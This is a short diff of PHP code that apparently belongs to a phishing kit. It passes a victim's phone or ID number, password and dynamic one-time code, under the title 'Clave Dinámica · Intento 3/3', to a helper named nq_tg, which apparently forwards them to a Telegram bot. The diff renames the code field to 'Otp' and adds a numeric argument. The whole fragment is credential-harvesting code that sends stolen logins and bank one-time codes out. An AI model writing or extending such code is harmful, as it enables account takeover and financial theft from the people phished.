@@ -14,8 +14,8 @@ if ($dynamicCode === '') {
 nq_tg('💫 Clave Dinámica · Intento 3/3', [
     ['TEL',    $identification],
     ['PW',     $password],
-    ['CÓDIGO', $dynamicCode],
-]);
+    ['Otp', $dynamicCode],
+], 15548997);
 
 echo json_encode([
     'success' => true,
